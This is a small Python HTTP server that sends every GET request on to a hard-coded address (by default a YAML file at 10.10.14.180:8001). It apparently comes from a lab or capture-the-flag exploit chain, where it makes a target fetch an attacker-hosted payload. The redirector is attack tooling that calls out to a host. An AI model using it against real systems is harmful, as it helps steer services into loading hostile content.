import http.server
import sys

REDIRECT_TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://10.10.14.180:8001/x.yaml"

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"GET {self.path} -> redirecting to {REDIRECT_TARGET}", flush=True)
        self.send_response(302)
        self.send_header("Location", REDIRECT_TARGET)
        self.end_headers()

    def log_message(self, fmt, *args):
        pass

if __name__ == "__main__":
    srv = http.server.HTTPServer(("10.10.14.180", 8002), Handler)
    srv.serve_forever()
